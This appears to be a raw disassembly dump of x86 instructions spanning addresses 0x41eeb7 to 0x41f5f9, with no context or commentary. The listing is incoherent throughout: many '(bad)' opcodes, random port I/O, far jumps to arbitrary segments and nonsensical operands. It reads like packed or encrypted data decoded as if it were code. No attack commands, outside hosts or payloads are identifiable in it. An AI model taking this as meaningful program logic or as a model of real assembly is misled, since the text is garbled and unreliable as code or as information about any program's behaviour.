  41eeb7:	sub    al,0xc8
  41eeb9:	mov    dl,0x85
  41eebb:	pop    edi
  41eebc:	icebp  
  41eebd:	push   ss
  41eebe:	jp     0x41eeae
  41eec0:	xchg   BYTE PTR [ebx+0x1e6d47de],al
  41eec6:	xor    al,0x2b
  41eec8:	mov    esi,0xd138ea70
  41eecd:	call   0xf57146e6
  41eed2:	jb     0x41ee75
  41eed4:	cmp    eax,0x23b93819
  41eed9:	inc    edx
  41eeda:	imul   eax,DWORD PTR [esi+0x49],0x8c3758d8
  41eee1:	adc    BYTE PTR [edi],dl
  41eee3:	ror    BYTE PTR [ecx+0xf785ecd],1
  41eee9:	enter  0xc67,0x93
  41eeed:	jge    0x41ef27
  41eeef:	cdq    
  41eef0:	adc    eax,0x4a3818df
  41eef5:	nop
  41eef6:	dec    ebx
  41eef7:	mov    DWORD PTR [ebx+ecx*1+0x77],ecx
  41eefb:	dec    ecx
  41eefc:	xchg   BYTE PTR [edi+eax*4+0x30],cl
  41ef00:	in     eax,0x95
  41ef02:	and    al,0x49
  41ef04:	loope  0x41ee8a
  41ef06:	cmp    BYTE PTR [ebx],bh
  41ef08:	inc    DWORD PTR [ebp+edx*2+0x75d5670a]
  41ef0f:	or     DWORD PTR [edx],edi
  41ef11:	add    BYTE PTR [edx+0x836db88],bl
  41ef17:	pop    esi
  41ef18:	jge    0x41ef7d
  41ef1a:	sub    al,0x31
  41ef1c:	mov    edi,0x20cc86a4
  41ef21:	mul    DWORD PTR [ecx]
  41ef23:	xchg   edx,eax
  41ef24:	jnp    0x41ef78
  41ef26:	aaa    
  41ef27:	call   0x299f:0x6b0a08c4
  41ef2e:	jae    0x41ef00
  41ef30:	rol    DWORD PTR [edx-0x3e],0x66
  41ef34:	inc    ebx
  41ef35:	push   ss
  41ef36:	aaa    
  41ef37:	in     eax,0x46
  41ef39:	rol    BYTE PTR [edx],cl
  41ef3b:	(bad)  
  41ef3d:	scas   al,BYTE PTR es:[edi]
  41ef3e:	dec    ebp
  41ef3f:	out    0x94,eax
  41ef41:	jmp    0x41efb0
  41ef43:	in     eax,dx
  41ef44:	ins    BYTE PTR es:[edi],dx
  41ef45:	and    al,0x14
  41ef47:	bound  edx,QWORD PTR [edi-0x14]
  41ef4a:	in     al,dx
  41ef4b:	sub    eax,0x77abe90a
  41ef50:	jecxz  0x41eef7
  41ef52:	xor    eax,0xd3553718
  41ef57:	push   es
  41ef58:	retf   
  41ef59:	jmp    0x41ef1e
  41ef5b:	inc    edx
  41ef5c:	daa    
  41ef5d:	aam    0x9b
  41ef5f:	inc    ecx
  41ef60:	xchg   ecx,eax
  41ef61:	sti    
  41ef62:	mov    dh,0x96
  41ef64:	or     edi,DWORD PTR [edx+0x74]
  41ef67:	sbb    al,0x11
  41ef69:	mov    ds:0xfd7158cc,al
  41ef6e:	(bad)  
  41ef6f:	loopne 0x41efeb
  41ef71:	jns    0x41efe3
  41ef73:	ss push ss
  41ef75:	loopne 0x41ef90
  41ef77:	in     eax,0xe0
  41ef79:	sbb    DWORD PTR [ebp-0x310894b1],0x3a
  41ef80:	push   esp
  41ef81:	mov    dh,0xdf
  41ef83:	sti    
  41ef84:	sub    DWORD PTR ds:0x29645b50,esp
  41ef8a:	sbb    eax,0x57ed807e
  41ef8f:	ja     0x41efdb
  41ef91:	icebp  
  41ef92:	or     BYTE PTR ds:0x7a3ce9a4,al
  41ef98:	icebp  
  41ef99:	mov    esp,DWORD PTR [edx]
  41ef9b:	push   esp
  41ef9c:	fs xchg ecx,eax
  41ef9e:	inc    edi
  41ef9f:	adc    DWORD PTR [esi],eax
  41efa1:	add    eax,0x68684006
  41efa6:	mov    WORD PTR [eax-0x31],ss
  41efa9:	out    dx,eax
  41efaa:	or     al,0xda
  41efac:	(bad)  
  41efad:	push   edi
  41efae:	adc    al,0x96
  41efb0:	or     cl,dl
  41efb2:	inc    esp
  41efb3:	inc    BYTE PTR [ebx+0x7783e76f]
  41efb9:	aam    0xfd
  41efbb:	sub    ebp,DWORD PTR [edx+0x2d]
  41efbe:	(bad)  
  41efbf:	ja     0x41ef85
  41efc1:	out    dx,al
  41efc2:	add    ecx,edx
  41efc4:	dec    ebx
  41efc5:	mov    es,ebp
  41efc7:	ret    
  41efc8:	mov    al,ds:0xedf9c391
  41efcd:	lods   eax,DWORD PTR ds:[esi]
  41efce:	inc    ebp
  41efcf:	cld    
  41efd0:	jg     0x41f050
  41efd2:	popf   
  41efd3:	out    dx,al
  41efd4:	pop    edx
  41efd5:	jge    0x41ef73
  41efd7:	jae    0x41f014
  41efd9:	pop    ss
  41efda:	add    eax,0xafbc00ee
  41efdf:	inc    ebx
  41efe0:	fnstsw WORD PTR [ecx]
  41efe2:	fmul   QWORD PTR [eax-0x75]
  41efe5:	nop
  41efe6:	je     0x41f01e
  41efe8:	icebp  
  41efe9:	xchg   ebx,eax
  41efea:	stos   BYTE PTR es:[edi],al
  41efeb:	pop    ebx
  41efec:	cmp    BYTE PTR [esi-0x738b0d27],bh
  41eff2:	leave  
  41eff3:	sbb    BYTE PTR [edx],al
  41eff5:	popa   
  41eff6:	in     eax,0xd0
  41eff8:	lea    esi,[eax+0x1]
  41effb:	dec    edx
  41effc:	(bad)  
  41effd:	hlt    
  41effe:	sti    
  41efff:	popa   
  41f000:	(bad)  
  41f001:	out    dx,eax
  41f002:	xchg   ecx,eax
  41f003:	sub    bh,bl
  41f005:	scas   eax,DWORD PTR es:[edi]
  41f006:	pop    esi
  41f007:	ror    ebp,1
  41f009:	xor    al,0x48
  41f00b:	adc    al,0x7
  41f00d:	outs   dx,BYTE PTR ds:[esi]
  41f00e:	(bad)  
  41f00f:	fmul   QWORD PTR ds:0xe2014bd9
  41f015:	iret   
  41f016:	imul   ebp,DWORD PTR [ebp+0x1e],0x9bd7ae7a
  41f01d:	shr    BYTE PTR [eax],0x4f
  41f020:	sar    DWORD PTR [edi+0x72],cl
  41f023:	pop    ecx
  41f024:	mov    edx,0xae44a63b
  41f029:	rcr    DWORD PTR [edi+0x4741eac5],cl
  41f02f:	pop    edx
  41f030:	daa    
  41f031:	sbb    ebp,edx
  41f033:	or     ah,BYTE PTR ds:0x2054930a
  41f039:	es hlt 
  41f03b:	cmp    eax,0xcf9cc6e7
  41f040:	sub    bh,BYTE PTR [edx-0x46]
  41f043:	out    dx,eax
  41f044:	(bad)  
  41f045:	and    BYTE PTR [edi],ch
  41f047:	cwde   
  41f048:	hlt    
  41f049:	push   eax
  41f04a:	es adc al,0xef
  41f04d:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41f04f:	fs mov ecx,0xe4615cc0
  41f055:	pushf  
  41f056:	xchg   esp,eax
  41f057:	out    dx,al
  41f058:	push   ss
  41f059:	jns    0x41efef
  41f05b:	mov    WORD PTR [ebx+0x6b],gs
  41f05e:	test   al,0x1c
  41f060:	inc    edi
  41f061:	xor    al,0xb
  41f063:	adc    eax,0x47259acb
  41f068:	xchg   BYTE PTR [ecx-0x7281ba4],dh
  41f06e:	xor    al,0xc1
  41f070:	test   DWORD PTR [ebx],esp
  41f072:	stc    
  41f073:	xlat   BYTE PTR ds:[ebx]
  41f074:	cmp    eax,0x7d7b5417
  41f079:	dec    ebx
  41f07a:	sahf   
  41f07b:	nop
  41f07c:	mov    ebx,0x1efa4d90
  41f081:	repnz adc edi,esp
  41f084:	inc    esp
  41f085:	xor    edi,DWORD PTR [edi+eax*1+0x4a]
  41f089:	stos   DWORD PTR es:[edi],eax
  41f08a:	cld    
  41f08b:	add    cl,ah
  41f08d:	test   BYTE PTR [ebx+0x41],al
  41f090:	scas   al,BYTE PTR es:[edi]
  41f091:	xchg   edx,eax
  41f092:	cdq    
  41f093:	test   BYTE PTR [esi-0x2d],ch
  41f096:	pop    edi
  41f097:	fwait
  41f098:	cmp    BYTE PTR [esi+0x39],al
  41f09b:	inc    ebp
  41f09c:	int3   
  41f09d:	mov    al,BYTE PTR [ebp+0x1b62939e]
  41f0a3:	ret    0xb249
  41f0a6:	sub    DWORD PTR [ebx+0x516f2bd2],ebp
  41f0ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0ad:	bswap  edi
  41f0af:	inc    ebx
  41f0b0:	cmp    eax,0x28d3b3a
  41f0b5:	mov    ?,WORD PTR es:[edi-0x4b]
  41f0b9:	and    eax,0x2e0d2a6f
  41f0be:	push   0xafd25970
  41f0c3:	pop    ebp
  41f0c4:	pop    ds
  41f0c5:	int3   
  41f0c6:	push   ebx
  41f0c7:	mov    dh,0x2c
  41f0c9:	pop    edx
  41f0ca:	ins    DWORD PTR es:[edi],dx
  41f0cb:	sbb    DWORD PTR [ebx],esp
  41f0cd:	dec    ecx
  41f0ce:	(bad)  
  41f0cf:	mov    ebp,0x8f31a8ff
  41f0d4:	inc    esi
  41f0d5:	xchg   ebp,eax
  41f0d6:	mov    ch,BYTE PTR [edx-0x68c9be8f]
  41f0dc:	jmp    0x7fd6:0xbeb590fb
  41f0e3:	add    dh,BYTE PTR [eax+0x5c]
  41f0e6:	pusha  
  41f0e7:	or     ch,BYTE PTR [esi-0x271ff0c1]
  41f0ed:	ret    0x4734
  41f0f0:	xor    BYTE PTR [edx+eiz*8],bl
  41f0f3:	je     0x41f0e1
  41f0f5:	add    DWORD PTR [ecx-0x4f],edx
  41f0f8:	mov    DWORD PTR [bx+di+0x5602],edi
  41f0fd:	cmp    esp,edx
  41f0ff:	sti    
  41f100:	pop    ss
  41f101:	xor    al,cl
  41f103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f104:	xor    bh,BYTE PTR [ebx-0x67678fcc]
  41f10a:	sahf   
  41f10b:	ret    
  41f10c:	jbe    0x41f14a
  41f10e:	push   ds
  41f10f:	shl    BYTE PTR [eax-0x1984eeac],1
  41f115:	mov    DWORD PTR [ebx+0xc8d9c03],edx
  41f11b:	fdivrp st(1),st
  41f11d:	scas   eax,DWORD PTR es:[edi]
  41f11e:	aad    0xe0
  41f120:	sub    DWORD PTR [esi+0x12a5d686],edx
  41f126:	sbb    al,0x47
  41f128:	stos   BYTE PTR es:[edi],al
  41f129:	(bad)  
  41f12b:	div    BYTE PTR ds:0xa3e6ff23
  41f131:	sti    
  41f132:	mov    ch,0xbe
  41f134:	repz gs dec esi
  41f137:	dec    edx
  41f138:	and    al,0x87
  41f13a:	(bad)  [ebx+0x4d459c0f]
  41f140:	pop    edi
  41f141:	mov    dh,0x56
  41f143:	xchg   edi,eax
  41f144:	pop    eax
  41f145:	lahf   
  41f146:	jmp    0xe8f5596d
  41f14b:	sub    cl,BYTE PTR [eax]
  41f14d:	add    al,0xbf
  41f14f:	sar    edi,0x76
  41f152:	shr    DWORD PTR [ecx-0x5773d4f1],0xe4
  41f159:	xor    esi,DWORD PTR [edi]
  41f15b:	mov    bh,BYTE PTR [edx]
  41f15d:	imul   al
  41f15f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f160:	and    BYTE PTR [edx+0x23],0x8d
  41f164:	push   0xffffff98
  41f166:	test   al,0x10
  41f168:	inc    ebp
  41f169:	retf   0xd71c
  41f16c:	cmp    DWORD PTR ds:0x6e4e752b,ebp
  41f172:	add    ebx,esp
  41f174:	push   ebp
  41f175:	in     eax,0x6f
  41f177:	jbe    0x41f1e9
  41f179:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f17a:	in     eax,0x53
  41f17c:	xor    dh,dl
  41f17e:	pop    ecx
  41f17f:	cmp    esi,DWORD PTR [esi]
  41f181:	add    BYTE PTR [esi-0x657d7567],bh
  41f187:	push   cs
  41f188:	scas   al,BYTE PTR es:[edi]
  41f189:	sbb    eax,0x58daaa73
  41f18e:	frstor [esi+0x15388a3d]
  41f194:	and    eax,0x800cc56a
  41f199:	(bad)  
  41f19a:	std    
  41f19b:	imul   eax,DWORD PTR ds:0x76ca2513,0xb
  41f1a2:	fsub   DWORD PTR [ecx]
  41f1a4:	cmp    DWORD PTR [ebx-0x89d7ab6],eax
  41f1aa:	add    al,0x7b
  41f1ac:	mov    ah,0x87
  41f1ae:	jnp    0x41f136
  41f1b0:	adc    esi,DWORD PTR [eax]
  41f1b2:	mov    ?,WORD PTR [edx+0x3c9a2f50]
  41f1b8:	jl     0x41f1e5
  41f1ba:	adc    eax,esp
  41f1bc:	int3   
  41f1bd:	test   al,0x96
  41f1bf:	loope  0x41f15f
  41f1c1:	ins    DWORD PTR es:[edi],dx
  41f1c2:	popa   
  41f1c3:	or     DWORD PTR [esi-0x52],ebp
  41f1c6:	inc    ebp
  41f1c7:	in     al,dx
  41f1c8:	imul   ebp,ebp,0x24
  41f1cb:	dec    dh
  41f1cd:	pop    ebp
  41f1ce:	imul   BYTE PTR [eax+0xe18eae]
  41f1d4:	outs   dx,BYTE PTR ds:[esi]
  41f1d5:	mov    bh,BYTE PTR [esi-0x64e02909]
  41f1db:	inc    ecx
  41f1dc:	jl     0x41f214
  41f1de:	sub    DWORD PTR [esi],edi
  41f1e0:	bound  eax,QWORD PTR [edx]
  41f1e2:	retf   0xca4a
  41f1e5:	aas    
  41f1e6:	and    al,0x6a
  41f1e8:	rcr    DWORD PTR [eax-0x67],cl
  41f1eb:	das    
  41f1ec:	shl    DWORD PTR [edi+ecx*2],1
  41f1ef:	ins    BYTE PTR es:[edi],dx
  41f1f0:	or     edx,0x224df6b
  41f1f6:	loopne 0x41f25b
  41f1f8:	iret   
  41f1f9:	sub    DWORD PTR [edi],ecx
  41f1fb:	pusha  
  41f1fc:	enter  0xc5b4,0x19
  41f200:	pop    ebp
  41f201:	inc    edi
  41f202:	ds cmp BYTE PTR es:[edx],cl
  41f206:	lds    ebx,FWORD PTR [ebx]
  41f208:	enter  0x79a5,0x25
  41f20c:	mov    al,ds:0xe635cae
  41f211:	inc    ebp
  41f212:	push   cs
  41f213:	cld    
  41f214:	mov    bh,0x4f
  41f216:	or     BYTE PTR [ebp+edx*2+0x1bd253e5],0xbb
  41f21e:	ins    BYTE PTR es:[edi],dx
  41f21f:	sbb    ebx,0x63658f62
  41f225:	push   cs
  41f226:	sub    al,dl
  41f228:	das    
  41f229:	mov    eax,ds:0xaf0c814e
  41f22e:	xchg   esi,eax
  41f22f:	in     eax,dx
  41f230:	sub    eax,0x6022bcf
  41f235:	add    DWORD PTR [edi],esi
  41f237:	dec    esp
  41f238:	lods   eax,DWORD PTR ds:[esi]
  41f239:	pop    ds
  41f23a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f23b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f23c:	mov    esi,0xf7407c7a
  41f241:	sbb    esp,DWORD PTR [edx+0x2]
  41f244:	mov    BYTE PTR ds:0x7609c784,dh
  41f24a:	sub    al,0x76
  41f24c:	mov    dl,0xf8
  41f24e:	xor    al,0xcf
  41f250:	sbb    eax,0x312ed6ee
  41f255:	dec    edx
  41f256:	mov    ?,WORD PTR [esi]
  41f258:	iret   
  41f259:	mov    ah,0x44
  41f25b:	or     bl,ah
  41f25d:	mov    al,BYTE PTR [edi]
  41f25f:	adc    eax,0xec5fc2d1
  41f264:	mov    WORD PTR [ebp+edx*4+0x10ebe98],gs
  41f26b:	sahf   
  41f26c:	jae    0x41f263
  41f26e:	cmp    BYTE PTR [eax+0x74],al
  41f271:	pusha  
  41f272:	push   esi
  41f273:	outs   dx,DWORD PTR ds:[esi]
  41f274:	push   edx
  41f275:	popa   
  41f276:	inc    edx
  41f277:	dec    esp
  41f278:	call   0x5e2a:0xd24d3bcf
  41f27f:	ret    
  41f280:	mov    esi,0xa7d797a2
  41f285:	cdq    
  41f286:	in     al,dx
  41f287:	iret   
  41f288:	fadd   QWORD PTR [ecx+0x66]
  41f28b:	mov    ds,WORD PTR [edi]
  41f28d:	addr16 in eax,dx
  41f28f:	push   cs
  41f290:	nop
  41f291:	xchg   bx,ax
  41f293:	fwait
  41f294:	push   ebx
  41f295:	pop    ecx
  41f296:	shl    ah,cl
  41f298:	xchg   edx,eax
  41f299:	sar    BYTE PTR [ebx],cl
  41f29b:	(bad)  [ebx]
  41f29d:	(bad)  
  41f29e:	fiadd  WORD PTR [esi+eiz*2+0x53]
  41f2a2:	repnz mov bh,0xce
  41f2a5:	cmp    ch,0xcd
  41f2a8:	jns    0x41f273
  41f2aa:	std    
  41f2ab:	ins    DWORD PTR es:[edi],dx
  41f2ac:	ficomp WORD PTR [ecx]
  41f2ae:	mov    esi,DWORD PTR [eax]
  41f2b0:	cld    
  41f2b1:	jbe    0x41f2f5
  41f2b3:	das    
  41f2b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2b5:	push   edi
  41f2b6:	cdq    
  41f2b7:	loopne 0x41f2d1
  41f2b9:	push   es
  41f2ba:	push   ds
  41f2bb:	jmp    0xe31a5b40
  41f2c0:	rol    DWORD PTR [ebp-0x17],1
  41f2c3:	mov    bl,0x1b
  41f2c5:	jge    0x41f32b
  41f2c7:	bnd jbe 0x41f330
  41f2ca:	cmp    al,0x77
  41f2cc:	ror    BYTE PTR [edx-0x3e5caf3f],cl
  41f2d2:	daa    
  41f2d3:	dec    eax
  41f2d4:	setl   al
  41f2d7:	xor    ah,BYTE PTR [ecx-0x53]
  41f2da:	pop    ds
  41f2db:	pop    ds
  41f2dc:	adc    DWORD PTR [ecx+edx*4-0x659b5f87],ecx
  41f2e3:	push   0x5a3231d5
  41f2e8:	daa    
  41f2e9:	mov    bh,0x23
  41f2eb:	push   ss
  41f2ec:	mov    ebx,0x3ef00e9f
  41f2f1:	xchg   DWORD PTR [ebx-0x7],edx
  41f2f4:	or     eax,0x6b690d6
  41f2f9:	push   esi
  41f2fa:	add    ah,bh
  41f2fc:	ds (bad) 
  41f2ff:	ret    
  41f300:	cdq    
  41f301:	fstp   QWORD PTR ds:0x121a793a
  41f307:	ret    
  41f308:	scas   eax,DWORD PTR es:[edi]
  41f309:	sti    
  41f30a:	xchg   esp,eax
  41f30b:	(bad)  
  41f30c:	ret    0xee6a
  41f30f:	mov    ecx,0x3fd0faed
  41f314:	cmp    cl,BYTE PTR [esi]
  41f316:	or     edx,esp
  41f318:	(bad)  
  41f319:	std    
  41f31a:	ret    
  41f31b:	sbb    al,0x86
  41f31d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f31e:	out    0xa2,al
  41f320:	loop   0x41f2b9
  41f322:	nop
  41f323:	jp     0x41f2ad
  41f325:	push   ebp
  41f326:	jo     0x41f2d7
  41f328:	cmp    DWORD PTR [esi+eax*1-0x6f],eax
  41f32c:	xchg   DWORD PTR ds:0xd07396ba,ecx
  41f332:	rol    BYTE PTR [eax-0x50],0xfd
  41f336:	retf   0x8ff6
  41f339:	mov    WORD PTR [ecx],ss
  41f33b:	dec    ebp
  41f33c:	retf   
  41f33d:	popf   
  41f33e:	inc    edi
  41f33f:	cmp    BYTE PTR [edi+esi*2],ch
  41f342:	jl     0x41f2e0
  41f344:	pusha  
  41f345:	add    al,0xeb
  41f347:	adc    al,0xac
  41f349:	mov    esi,DWORD PTR [eax+0x52fd9a6f]
  41f34f:	(bad)  
  41f351:	inc    edx
  41f352:	stc    
  41f353:	aam    0x8c
  41f355:	out    0xf6,eax
  41f357:	mov    ds:0x83e4c5c9,al
  41f35c:	xchg   edx,eax
  41f35d:	shl    BYTE PTR fs:[ebx+0x24],cl
  41f361:	sbb    edi,DWORD PTR ds:0x75b96979
  41f367:	add    esi,ebx
  41f369:	inc    edx
  41f36a:	push   0xfe96924e
  41f36f:	out    dx,eax
  41f370:	(bad)  
  41f371:	jg     0x41f31a
  41f373:	cld    
  41f374:	or     eax,0x57b2a7c5
  41f379:	mov    dl,0x9d
  41f37b:	sub    al,0x3
  41f37d:	push   ebx
  41f37e:	inc    esi
  41f37f:	pop    edx
  41f380:	mov    ds:0x52a168da,al
  41f385:	push   ebx
  41f386:	mov    ds:0xde74467d,eax
  41f38b:	int    0x4f
  41f38d:	xor    al,0x1f
  41f38f:	adc    edx,DWORD PTR [ebx+0x7ae8ac80]
  41f395:	shl    DWORD PTR [edx-0x67],1
  41f398:	mov    ebp,0x5f4b8f4d
  41f39d:	xor    DWORD PTR [eax],edx
  41f39f:	adc    dh,ch
  41f3a1:	cli    
  41f3a2:	and    BYTE PTR [ebx],bl
  41f3a4:	out    0xbd,al
  41f3a6:	cmp    esp,DWORD PTR cs:[edi-0x27]
  41f3aa:	and    BYTE PTR ds:0x78c9f15c,cl
  41f3b0:	aaa    
  41f3b1:	cmp    al,0xcb
  41f3b3:	sub    dl,cl
  41f3b5:	out    dx,eax
  41f3b6:	enter  0xd1d9,0xd3
  41f3ba:	iret   
  41f3bb:	pushf  
  41f3bc:	nop
  41f3bd:	jae    0x41f35c
  41f3bf:	iret   
  41f3c0:	jl     0x41f360
  41f3c2:	lods   eax,DWORD PTR ds:[esi]
  41f3c3:	dec    eax
  41f3c4:	xor    bh,BYTE PTR [edi]
  41f3c6:	jae    0x41f3ff
  41f3c8:	mov    eax,ds:0xc924fd9
  41f3cd:	cmc    
  41f3ce:	inc    edx
  41f3cf:	pop    edi
  41f3d0:	dec    eax
  41f3d1:	(bad)  
  41f3d2:	xor    bl,BYTE PTR [esi+0x5749d88c]
  41f3d8:	retf   
  41f3d9:	gs fwait
  41f3db:	idiv   DWORD PTR [eax-0x46]
  41f3de:	and    DWORD PTR [edx-0x7b],ebp
  41f3e1:	jno    0x41f378
  41f3e3:	retf   0xe80
  41f3e6:	out    dx,al
  41f3e7:	xor    BYTE PTR [edx],dl
  41f3e9:	jle    0x41f36d
  41f3eb:	(bad)  
  41f3ec:	xlat   BYTE PTR ds:[ebx]
  41f3ed:	jne    0x41f455
  41f3ef:	std    
  41f3f0:	cs faddp st(0),st
  41f3f3:	ds adc al,0x30
  41f3f6:	inc    esi
  41f3f7:	pop    ebx
  41f3f8:	stos   BYTE PTR es:[edi],al
  41f3f9:	ds dec edi
  41f3fb:	retf   
  41f3fc:	mov    eax,ds:0xe6c2a3b5
  41f401:	das    
  41f402:	dec    edx
  41f403:	iret   
  41f404:	jmp    0xfa970000
  41f409:	or     al,0xd2
  41f40b:	push   es
  41f40c:	add    eax,0x4d842ce6
  41f411:	sti    
  41f412:	inc    edi
  41f413:	imul   ecx,edx,0xffffffe2
  41f416:	ds pop ebx
  41f418:	push   0x4176c51a
  41f41d:	jno    0x41f42e
  41f41f:	test   eax,edx
  41f421:	aas    
  41f422:	adc    al,0x7e
  41f424:	xor    esi,ebp
  41f426:	jle    0x41f406
  41f428:	push   ss
  41f429:	xor    eax,0x31f6d80d
  41f42e:	add    edi,edi
  41f430:	pop    ebx
  41f431:	fsubr  DWORD PTR [ebx]
  41f433:	pop    ebx
  41f434:	(bad)  
  41f436:	je     0x41f436
  41f438:	xor    DWORD PTR [ebx+0x7585c6c6],ebp
  41f43e:	cmp    al,0xbc
  41f440:	dec    ebp
  41f441:	xchg   edx,eax
  41f442:	loop   0x41f3cf
  41f444:	fs and eax,0x450c7d84
  41f44a:	pop    esi
  41f44b:	daa    
  41f44c:	pop    ebx
  41f44d:	(bad)  
  41f44e:	cmp    DWORD PTR [esi-0x263118f0],esp
  41f454:	cmp    DWORD PTR [eax+0x11f89599],esp
  41f45a:	inc    dh
  41f45c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f45d:	into   
  41f45e:	sbb    DWORD PTR [ebp-0x6e337a2f],ebp
  41f464:	icebp  
  41f465:	out    0xb1,al
  41f467:	aaa    
  41f468:	and    DWORD PTR [ebp+0x49c9de33],0x32
  41f46f:	jo     0x41f4a9
  41f471:	in     eax,0xff
  41f473:	cmc    
  41f474:	fidiv  DWORD PTR [ecx-0x33]
  41f477:	mov    bl,0x51
  41f479:	int    0xbf
  41f47b:	sub    DWORD PTR [edi+eax*8+0x2d98a9da],edx
  41f482:	dec    esi
  41f483:	test   DWORD PTR [ebp+esi*8+0x33],0x99f2350d
  41f48b:	pushf  
  41f48c:	or     eax,DWORD PTR [edx-0x76dd050b]
  41f492:	or     al,0xc5
  41f494:	or     al,0xc6
  41f496:	mov    esp,0xac2f9f83
  41f49b:	gs pusha 
  41f49d:	dec    esi
  41f49e:	push   ebp
  41f49f:	jecxz  0x41f50b
  41f4a1:	popa   
  41f4a2:	jns    0x41f471
  41f4a4:	adc    ch,BYTE PTR [edx-0x8]
  41f4a7:	jo     0x41f505
  41f4a9:	add    al,0x46
  41f4ab:	stos   BYTE PTR es:[edi],al
  41f4ac:	push   esi
  41f4ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4ae:	sub    al,0x4
  41f4b0:	pusha  
  41f4b1:	pop    esi
  41f4b2:	mov    esp,0xbfe998d2
  41f4b7:	jmp    0x46809439
  41f4bc:	scas   al,BYTE PTR es:[edi]
  41f4bd:	test   DWORD PTR [edx],edi
  41f4bf:	mov    WORD PTR fs:[edi],ss
  41f4c2:	fwait
  41f4c3:	ror    DWORD PTR [ecx+0x4a20960],1
  41f4c9:	std    
  41f4ca:	in     eax,0xf9
  41f4cc:	push   0xffffff81
  41f4ce:	pop    edx
  41f4cf:	mov    esp,0xf9e14c0e
  41f4d4:	sahf   
  41f4d5:	cmp    edi,DWORD PTR cs:[edx+0x73]
  41f4d9:	mov    esp,0x2991b240
  41f4de:	and    eax,0xb94b1f3d
  41f4e3:	lock ret 
  41f4e5:	cwde   
  41f4e6:	mov    ecx,0x95a37bce
  41f4eb:	jo     0x41f489
  41f4ed:	xlat   BYTE PTR ds:[ebx]
  41f4ee:	jo     0x41f4b9
  41f4f0:	mov    DWORD PTR [eax],edx
  41f4f2:	ds scas al,BYTE PTR es:[edi]
  41f4f4:	imul   edx,ebp,0x1f
  41f4f7:	sar    DWORD PTR [si],cl
  41f4fa:	adc    eax,0x49967301
  41f4ff:	ins    DWORD PTR es:[edi],dx
  41f500:	dec    edi
  41f501:	xchg   ebp,eax
  41f502:	sub    esi,ebp
  41f504:	mov    ds,ebx
  41f506:	pop    eax
  41f507:	jge    0x41f524
  41f509:	jno    0x41f506
  41f50b:	sbb    ch,BYTE PTR [ecx+eiz*8-0x6ea58adf]
  41f512:	fs out 0xb8,al
  41f515:	test   DWORD PTR [edx+0x7ea174d6],edx
  41f51b:	(bad)  
  41f51d:	daa    
  41f51e:	push   esp
  41f51f:	sahf   
  41f520:	repnz aas 
  41f522:	sub    BYTE PTR [eax+0x32],ah
  41f525:	dec    ebp
  41f526:	call   0x9c057371
  41f52b:	mov    esp,DWORD PTR [ebx-0x27]
  41f52e:	pop    es
  41f52f:	aaa    
  41f530:	lds    esi,FWORD PTR [eax]
  41f532:	inc    esp
  41f533:	cmp    dl,BYTE PTR [edi]
  41f535:	dec    ebx
  41f536:	or     eax,0xe0ebe528
  41f53b:	fcomp  QWORD PTR [edx+0x25]
  41f53e:	fdiv   st,st(2)
  41f540:	mov    ds:0xff466718,eax
  41f545:	xor    cl,BYTE PTR [esi-0xa6207c]
  41f54b:	cmp    al,0x44
  41f54d:	mov    ecx,0x8eeb6ecf
  41f552:	sbb    eax,0xc775a981
  41f557:	jl     0x41f57c
  41f559:	iret   
  41f55a:	sbb    ecx,DWORD PTR [ebx]
  41f55c:	int3   
  41f55d:	(bad)  
  41f55e:	retf   0x2640
  41f561:	jo     0x41f550
  41f563:	xchg   ebx,eax
  41f564:	push   ds
  41f565:	mov    ebp,0x50e0e092
  41f56a:	add    esi,esi
  41f56c:	pop    esp
  41f56d:	bound  esi,QWORD PTR [edi+esi*2]
  41f570:	mov    BYTE PTR [ecx+eiz*8-0x68],cl
  41f574:	xchg   esi,eax
  41f575:	stos   BYTE PTR es:[edi],al
  41f576:	mov    ds:0xa7ac6669,al
  41f57b:	mov    esi,0xffd4344f
  41f580:	push   cs
  41f581:	xor    al,0xc4
  41f583:	repnz adc ebx,DWORD PTR [esi+ecx*2]
  41f587:	(bad)  
  41f588:	mov    esp,0x3b046e87
  41f58d:	in     al,dx
  41f58e:	out    0xbc,eax
  41f590:	fisubr WORD PTR [edx-0x19]
  41f593:	ins    BYTE PTR es:[edi],dx
  41f594:	push   ecx
  41f595:	imul   eax,DWORD PTR [esi-0x2d],0x65
  41f599:	ficomp DWORD PTR [edx]
  41f59b:	jmp    0xf2cad564
  41f5a0:	icebp  
  41f5a1:	imul   esp,ecx,0xbe1a648a
  41f5a7:	imul   eax,DWORD PTR [edx],0xffffff86
  41f5aa:	lods   al,BYTE PTR ds:[esi]
  41f5ab:	sub    DWORD PTR [eax],eax
  41f5ad:	and    al,0x6e
  41f5af:	sbb    bh,BYTE PTR [esi+0x6c]
  41f5b2:	push   0xb5fbd132
  41f5b7:	sbb    cl,dl
  41f5b9:	xchg   ebp,eax
  41f5ba:	mov    DWORD PTR [ebp+0x6f],eax
  41f5bd:	or     al,0xc6
  41f5bf:	mov    edi,0xa99cb19e
  41f5c4:	or     eax,0x93dc0971
  41f5c9:	pop    es
  41f5ca:	push   ebp
  41f5cb:	adc    bl,dh
  41f5cd:	sub    ebx,esp
  41f5cf:	(bad)  
  41f5d0:	ficom  WORD PTR [ecx+0x571c274a]
  41f5d6:	lods   al,BYTE PTR ds:[esi]
  41f5d7:	and    cl,BYTE PTR [ebx]
  41f5d9:	cwde   
  41f5da:	xlat   BYTE PTR ds:[ebx]
  41f5db:	out    0xbd,eax
  41f5dd:	and    eax,0xfa9f3ab9
  41f5e2:	or     al,0xc9
  41f5e4:	dec    esi
  41f5e5:	jnp    0x41f5e6
  41f5e7:	mov    bl,0x44
  41f5e9:	jg     0x41f62a
  41f5eb:	psubw  mm3,QWORD PTR [ecx+0x19692bab]
  41f5f2:	bound  ecx,QWORD PTR [ebx-0x29]
  41f5f5:	jae    0x41f659
  41f5f7:	xor    esi,esp
  41f5f9:	in     al,dx
